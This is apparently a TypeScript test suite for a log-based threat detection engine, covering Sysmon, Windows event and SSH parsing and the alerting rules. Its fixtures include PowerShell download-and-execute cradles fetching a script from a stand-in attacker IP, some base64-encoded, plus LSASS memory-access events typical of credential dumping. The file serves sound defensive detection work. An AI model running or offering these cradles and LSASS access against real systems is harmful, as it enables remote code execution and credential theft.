import { describe, expect, it } from 'vitest'
import { detect } from '../src/engine'
import { parseLog } from '../src/parser'
import { parseMessageFields } from '../src/parser/sysmon'
import { cradleReasons } from '../src/rules/powershellCradle'
import { sshFail } from './helpers'

const b64 = (s: string) => Buffer.from(s, 'utf16le').toString('base64')
const CRADLE = 'IEX (New-Object Net.WebClient).DownloadString("http://203.0.113.9/a.ps1")'
const enc = b64(CRADLE)
const PS = 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe'
const CMD = 'C:\\Windows\\System32\\cmd.exe'
const WORD = 'C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE'

function run(text: string) {
  const p = parseLog(text, { defaultYear: 2026 })
  return { events: p.events, alerts: detect(p.events).findings.map((f) => `${f.ruleId}:${f.severity}`) }
}
const sysmon = (o: Record<string, string>) => JSON.stringify({ EventCode: '1', Computer: 'WIN1', ...o })

describe('probe regression A-L', () => {
  it('A: Winlogbeat/ECS nested Sysmon JSON with encoded PowerShell is parsed and alerts (high: decoded IEX/DownloadString)', () => {
    const line = JSON.stringify({
      '@timestamp': '2026-10-23T08:03:00Z',
      host: { name: 'WIN1' },
      winlog: { event_id: 1, channel: 'Microsoft-Windows-Sysmon/Operational', event_data: { Image: PS, CommandLine: `powershell.exe -NoP -enc ${enc}`, ParentImage: CMD } },
    })
    const r = run(line)
    expect(r.events).toHaveLength(1)
    expect(r.events[0].host).toBe('WIN1')
    expect(r.events[0].time).toBe('2026-10-23T08:03:00.000Z')
    expect(r.events[0].fields.EventCode).toBe('1')
    expect(r.events[0].fields.ParentImage).toBe(CMD)
    expect(r.alerts).toEqual(['powershell-encoded-command:high'])
  })

  it('B: flat Splunk-style EventCode with -NoP -enc and a harmless payload stays medium', () => {
    const r = run(sysmon({ UtcTime: '2026-10-23 08:03:00.123', Image: PS, CommandLine: `powershell.exe -NoP -enc ${b64("Write-Host 'lab test'")}`, ParentImage: CMD }))
    expect(r.events).toHaveLength(1)
    expect(r.alerts).toEqual(['powershell-encoded-command:medium'])
  })

  it('B2: flat format with the encoded payload that downloads and executes is high', () => {
    expect(run(sysmon({ Image: PS, CommandLine: `powershell.exe -NoP -enc ${enc}`, ParentImage: CMD })).alerts).toEqual(['powershell-encoded-command:high'])
  })

  it('C: Get-WinEvent | ConvertTo-Json with encoded PowerShell is parsed and alerts', () => {
    const line = JSON.stringify({
      Id: 1,
      TimeCreated: '2026-10-23T08:03:00',
      MachineName: 'WIN1',
      Message: `Process Create:\nImage: ${PS}\nCommandLine: powershell.exe -enc ${b64("Write-Host 'x'")}\nParentImage: ${CMD}`,
    })
    const r = run(line)
    expect(r.events).toHaveLength(1)
    expect(r.events[0].host).toBe('WIN1')
    expect(r.events[0].fields.Image).toBe(PS)
    expect(r.alerts).toEqual(['powershell-encoded-command:medium'])
  })

  it('D: benign schtasks backup task from cmd.exe is LOW (listed, not high)', () => {
    const r = run(sysmon({ Image: 'C:\\Windows\\System32\\schtasks.exe', CommandLine: 'schtasks /create /tn "Nightly backup" /tr "D:\\scripts\\backup.cmd" /sc daily /st 02:00', ParentImage: CMD }))
    expect(r.alerts).toEqual(['schtasks-create:low'])
  })

  it('E: CrowdStrike under Program Files opening lsass with 0x1410 does not alert', () => {
    expect(run(sysmon({ EventCode: '10', SourceImage: 'C:\\Program Files\\CrowdStrike\\CSFalconService.exe', TargetImage: 'C:\\Windows\\system32\\lsass.exe', GrantedAccess: '0x1410' })).alerts).toEqual([])
  })

  it('F: Azure guest agent parent running -EncodedCommand does not alert', () => {
    expect(run(sysmon({ Image: PS, CommandLine: `powershell.exe -ExecutionPolicy Bypass -NonInteractive -EncodedCommand ${b64('Get-Date')}`, ParentImage: 'C:\\WindowsAzure\\GuestAgent_2.7\\WaAppAgent.exe' })).alerts).toEqual([])
  })

  it('G: non-encoded IEX/DownloadString cradle from Word is now detected as high', () => {
    const r = run(sysmon({ Image: PS, CommandLine: `powershell -nop -w hidden -c "IEX (New-Object Net.WebClient).DownloadString('http://203.0.113.9/a.ps1')"`, ParentImage: WORD }))
    expect(r.alerts).toEqual(['powershell-download-cradle:high'])
  })

  it('H: LSASS access by procdump (0x1fffff) still alerts high', () => {
    expect(run(sysmon({ EventCode: '10', SourceImage: 'C:\\Tools\\procdump64.exe', TargetImage: 'C:\\Windows\\system32\\lsass.exe', GrantedAccess: '0x1fffff' })).alerts).toEqual(['lsass-memory-access:high'])
  })

  it('I: LSASS access by a temp binary, upper-case paths and mask, still alerts high', () => {
    expect(run(sysmon({ EventCode: '10', SourceImage: 'C:\\Users\\x\\AppData\\Local\\Temp\\m.exe', TargetImage: 'C:\\WINDOWS\\SYSTEM32\\LSASS.EXE', GrantedAccess: '0x1FFFFF' })).alerts).toEqual(['lsass-memory-access:high'])
  })

  it('J: RFC 3339 SSH failures 10 s apart followed by a success are critical', () => {
    const lines = Array.from({ length: 6 }, (_, i) => `2026-10-23T09:20:${String(i * 10).padStart(2, '0')}.123456+08:00 web01 sshd[1234]: Failed password for root from 203.0.113.45 port 4${i}000 ssh2`)
    lines.push('2026-10-23T09:21:05.123456+08:00 web01 sshd[1234]: Accepted password for root from 203.0.113.45 port 41000 ssh2')
    const r = run(lines.join('\n'))
    expect(r.events).toHaveLength(7)
    expect(r.alerts).toEqual(['ssh-brute-force:critical'])
  })

  it('K: classic syslog SSH failures 10 s apart followed by a success are critical', () => {
    const lines = Array.from({ length: 6 }, (_, i) => sshFail(`09:20:${String(i * 10).padStart(2, '0')}`, '203.0.113.45', 'admin'))
    lines.push('Oct 23 09:21:05 lab-ubuntu01 sshd[100]: Accepted password for admin from 203.0.113.45 port 41000 ssh2')
    expect(run(lines.join('\n')).alerts).toEqual(['ssh-brute-force:critical'])
  })

  it('J/K slow burn: 6 failures spread over 5 minutes (outside the 120 s window) are NOT flagged, by design', () => {
    const lines = Array.from({ length: 6 }, (_, i) => sshFail(`09:2${i}:05`))
    expect(run(lines.join('\n')).alerts).toEqual([])
  })

  it('L: three typos then a login for the same user does not alert', () => {
    const text = ['Oct 23 09:20:05 web01 sshd[1]: Failed password for alice from 198.51.100.7 port 4000 ssh2', 'Oct 23 09:20:15 web01 sshd[1]: Failed password for alice from 198.51.100.7 port 4001 ssh2', 'Oct 23 09:20:25 web01 sshd[1]: Accepted password for alice from 198.51.100.7 port 4002 ssh2'].join('\n')
    const r = run(text)
    expect(r.events).toHaveLength(3)
    expect(r.alerts).toEqual([])
  })
})

describe('parser formats', () => {
  it('accepts EventID, event_id and event.code spellings with string or numeric ids', () => {
    for (const o of [{ EventID: 1 }, { EventID: '1' }, { event_id: 1 }, { event_id: '1' }, { 'event.code': '1' }, { event: { code: '1' } }, { EventCode: 1 }, { EventID: { '#text': '1' } }]) {
      const r = parseLog(JSON.stringify({ ...o, Image: PS, CommandLine: `powershell -enc ${enc}` }))
      expect(r.events, JSON.stringify(o)).toHaveLength(1)
      expect(r.events[0].fields.EventCode).toBe('1')
    }
  })

  it('winlog.event_id as a string and ECS mapping for events 10 and 13', () => {
    const lines = [
      { '@timestamp': '2026-10-23T08:06:15.000+08:00', host: { name: 'W' }, winlog: { event_id: '10', event_data: { SourceImage: 'C:\\Tools\\d.exe', TargetImage: 'C:\\Windows\\System32\\lsass.exe', GrantedAccess: '0x1fffff' } } },
      { '@timestamp': '2026-10-23T08:07:00Z', winlog: { computer_name: 'W2', event_id: 13, user: { name: 'bob' }, event_data: { TargetObject: 'HKU\\S-1\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\U', Details: 'C:\\Users\\bob\\AppData\\u.exe' } } },
    ].map((o) => JSON.stringify(o)).join('\n')
    const r = parseLog(lines)
    expect(r.events.map((e) => e.fields.EventCode)).toEqual(['10', '13'])
    expect(r.events[0].time).toBe('2026-10-23T00:06:15.000Z') // offset honoured
    expect(r.events[1].host).toBe('W2')
    expect(r.events[1].user).toBe('bob')
    expect(detect(r.events).findings.map((f) => `${f.ruleId}:${f.severity}`).sort()).toEqual(['lsass-memory-access:high', 'registry-run-key:high'])
  })

  it('dotted (flattened) Elastic keys work too', () => {
    const r = parseLog(JSON.stringify({ '@timestamp': '2026-10-23T08:03:00Z', 'host.name': 'W', 'winlog.event_id': 1, 'winlog.event_data.Image': PS, 'winlog.event_data.CommandLine': `powershell -enc ${enc}` }))
    expect(r.events).toHaveLength(1)
    expect(r.events[0].fields.Image).toBe(PS)
    expect(r.events[0].host).toBe('W')
  })

  it('Get-WinEvent Message layouts for Sysmon events 1, 10 and 13, in a JSON array', () => {
    const arr = [
      { Id: 1, MachineName: 'W', TimeCreated: '2026-10-23T08:03:00Z', Message: `Process Create:\r\nRuleName: -\r\nUtcTime: 2026-10-23 08:03:00.123\r\nImage: ${PS}\r\nCommandLine: powershell -enc ${enc}\r\nUser: W\\bob\r\nParentImage: ${WORD}` },
      { Id: 10, MachineName: 'W', TimeCreated: '/Date(1792742400000)/', Message: 'Process accessed:\nSourceImage: C:\\Tools\\d.exe\nTargetImage: C:\\Windows\\System32\\lsass.exe\nGrantedAccess: 0x1FFFFF\nCallTrace: C:\\Windows\\SYSTEM32\\ntdll.dll+9d4c4' },
      { Id: '13', MachineName: 'W', Message: 'Registry value set:\nEventType: SetValue\nTargetObject: HKU\\S-1\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\U\nDetails: C:\\Users\\bob\\AppData\\u.exe' },
    ]
    const r = parseLog(JSON.stringify(arr))
    expect(r.events).toHaveLength(3)
    expect(r.events[0].user).toBe('W\\bob')
    expect(r.events[0].time).toBe('2026-10-23T08:03:00.000Z')
    expect(r.events[1].fields.GrantedAccess).toBe('0x1FFFFF')
    expect(r.events[1].time).toBeDefined()
    expect(r.events[2].fields.Details).toBe('C:\\Users\\bob\\AppData\\u.exe')
    expect(detect(r.events).findings.map((f) => f.ruleId).sort()).toEqual(['lsass-memory-access', 'powershell-encoded-command', 'registry-run-key'])
  })

  it('parseMessageFields splits on the first colon and ignores the title and paths', () => {
    expect(parseMessageFields('Process Create:\nImage: C:\\a\\b.exe\nC:\\not\\a\\key\nCommandLine: x -c "a: b"')).toEqual({ Image: 'C:\\a\\b.exe', CommandLine: 'x -c "a: b"' })
  })

  it('does not treat arbitrary JSON with an Id field as an event', () => {
    expect(parseLog('{"Id": 5, "name": "widget"}\n{"foo": 1}').events).toHaveLength(0)
  })
})

describe('lsass allowlist requires a protected path', () => {
  const lsass = (src: string) => run(sysmon({ EventCode: '10', SourceImage: src, TargetImage: 'C:\\Windows\\System32\\lsass.exe', GrantedAccess: '0x1410' })).alerts
  it('known security software in protected folders is ignored (case-insensitive)', () => {
    for (const p of [
      'C:\\Program Files\\CrowdStrike\\CSFalconService.exe',
      'c:\\program files\\crowdstrike\\csfalconservice.exe',
      'C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\4.18\\MsMpEng.exe',
      'C:\\Program Files\\Windows Defender Advanced Threat Protection\\MsSense.exe',
      'C:\\Program Files (x86)\\Sophos\\SophosFS.exe',
      'C:\\Windows\\System32\\taskmgr.exe',
      'C:\\Windows\\System32\\svchost.exe',
    ]) expect(lsass(p), p).toEqual([])
  })
  it('the same file names in user-writable folders STILL alert', () => {
    expect(lsass('C:\\Users\\x\\AppData\\Local\\Temp\\csfalconservice.exe')).toEqual(['lsass-memory-access:high'])
    expect(lsass('C:\\Users\\Public\\msmpeng.exe')).toEqual(['lsass-memory-access:high'])
    expect(lsass('C:\\Windows\\Temp\\svchost.exe')).toEqual(['lsass-memory-access:high'])
  })
  it('path tricks do not pass the allowlist', () => {
    expect(lsass('C:\\Program Files\\..\\Users\\x\\csfalconservice.exe')).toEqual(['lsass-memory-access:high'])
    expect(lsass('D:\\Program Files\\CrowdStrike\\csfalconservice.exe')).toEqual(['lsass-memory-access:high'])
  })
})

describe('powershell-encoded-command allowlist and severity', () => {
  const ps = (parent: string, payload = 'Get-Date', extra = '') => run(sysmon({ Image: PS, CommandLine: `powershell.exe ${extra} -EncodedCommand ${b64(payload)}`, ParentImage: parent })).alerts
  it('Azure guest agent and Monitoring Agent are allowlisted only under their folders', () => {
    expect(ps('C:\\WindowsAzure\\GuestAgent_2.7\\WaAppAgent.exe')).toEqual([])
    expect(ps('C:\\Packages\\Plugins\\x\\WindowsAzureGuestAgent.exe')).toEqual([])
    expect(ps('C:\\Program Files\\Microsoft Monitoring Agent\\Agent\\MonitoringHost.exe')).toEqual([])
    expect(ps('C:\\Users\\x\\AppData\\Local\\Temp\\WaAppAgent.exe')).toEqual(['powershell-encoded-command:medium'])
  })
  it('severity rises for each download/execute indicator and for a hidden window', () => {
    for (const payload of ['iex $x', 'Invoke-Expression $x', '(New-Object Net.WebClient).DownloadFile("http://a/b","c")', '[Convert]::FromBase64String($s)']) {
      expect(ps(CMD, payload), payload).toEqual(['powershell-encoded-command:high'])
    }
    expect(ps(CMD, 'Get-Date', '-w hidden')).toEqual(['powershell-encoded-command:high'])
    expect(ps(CMD, 'Get-Date', '-WindowStyle Hidden')).toEqual(['powershell-encoded-command:high'])
  })
  it('severity stays medium for an ordinary payload and -NoProfile alone', () => {
    expect(ps(CMD, 'Get-Date')).toEqual(['powershell-encoded-command:medium'])
    expect(ps(CMD, 'Get-Date', '-NoProfile')).toEqual(['powershell-encoded-command:medium'])
  })
})

describe('powershell-download-cradle', () => {
  const cmdline = (c: string, parent = CMD, image = PS) => run(sysmon({ Image: image, CommandLine: c, ParentImage: parent })).alerts
  it('true positive: IEX + DownloadString from a shell is medium', () => {
    expect(cmdline(`powershell -c "IEX (New-Object Net.WebClient).DownloadString('http://203.0.113.9/a.ps1')"`)).toEqual(['powershell-download-cradle:medium'])
  })
  it('true positive: iwr piped to iex, and pwsh', () => {
    expect(cmdline('pwsh -Command "iwr http://203.0.113.9/a.ps1 | iex"', CMD, 'C:\\Program Files\\PowerShell\\7\\pwsh.exe')).toEqual(['powershell-download-cradle:medium'])
    expect(cmdline('powershell -Command "Invoke-Expression (Invoke-WebRequest http://203.0.113.9/a.ps1).Content"')).toEqual(['powershell-download-cradle:medium'])
  })
  it('true positive: hidden window + -NoProfile + URL without IEX', () => {
    expect(cmdline('powershell -NoProfile -WindowStyle Hidden -File http://203.0.113.9/a.ps1')).toEqual(['powershell-download-cradle:medium'])
  })
  it('high when launched by Office, a browser or a script host', () => {
    for (const parent of [WORD, 'C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe', 'C:\\Windows\\System32\\wscript.exe']) {
      expect(cmdline(`powershell -nop -w hidden -c "iex ((New-Object Net.WebClient).DownloadString('http://203.0.113.9/a.ps1'))"`, parent)).toEqual(['powershell-download-cradle:high'])
    }
  })
  it('false positives: admin one-liners, plain downloads with no execution, allowlisted agent parents', () => {
    expect(cmdline('powershell -Command Get-Date')).toEqual([])
    expect(cmdline('powershell -Command "Invoke-WebRequest https://example.com/setup.zip -OutFile C:\\Temp\\setup.zip"')).toEqual([])
    expect(cmdline('powershell -NoProfile -Command "(New-Object Net.WebClient).DownloadFile(\'https://example.com/a.msi\',\'a.msi\')"')).toEqual([])
    expect(cmdline('powershell -File C:\\scripts\\deploy.ps1 -NoProfile')).toEqual([])
    expect(cmdline(`powershell -c "iex (New-Object Net.WebClient).DownloadString('http://a/b')"`, 'C:\\WindowsAzure\\GuestAgent_2.7\\WaAppAgent.exe')).toEqual([])
    expect(cmdline(`notepad.exe "iex downloadstring"`, CMD, 'C:\\Windows\\notepad.exe')).toEqual([])
  })
  it('an encoded command is left to the encoded-command rule (no double alert)', () => {
    expect(cmdline(`powershell -nop -w hidden -enc ${enc}`)).toEqual(['powershell-encoded-command:high'])
  })
  it('cradleReasons is linear on pathological input', () => {
    const t = Date.now()
    cradleReasons('powershell ' + '-w '.repeat(20000) + 'x'.repeat(20000))
    expect(Date.now() - t).toBeLessThan(500)
  })
})

describe('lsass allowlist: 32-bit Windows binaries', () => {
  it('does not alert on WmiPrvSE.exe from SysWOW64', () => {
    const line = JSON.stringify({ EventCode: '10', Computer: 'W', SourceImage: 'C:\\Windows\\SysWOW64\\wbem\\WmiPrvSE.exe', TargetImage: 'C:\\Windows\\system32\\lsass.exe', GrantedAccess: '0x1410' })
    expect(detect(parseLog(line).events).findings).toEqual([])
  })
  it('still alerts when the same name runs from a user folder', () => {
    const line = JSON.stringify({ EventCode: '10', Computer: 'W', SourceImage: 'C:\\Users\\x\\AppData\\Local\\Temp\\WmiPrvSE.exe', TargetImage: 'C:\\Windows\\system32\\lsass.exe', GrantedAccess: '0x1410' })
    expect(detect(parseLog(line).events).findings.map((f) => f.ruleId)).toEqual(['lsass-memory-access'])
  })
})
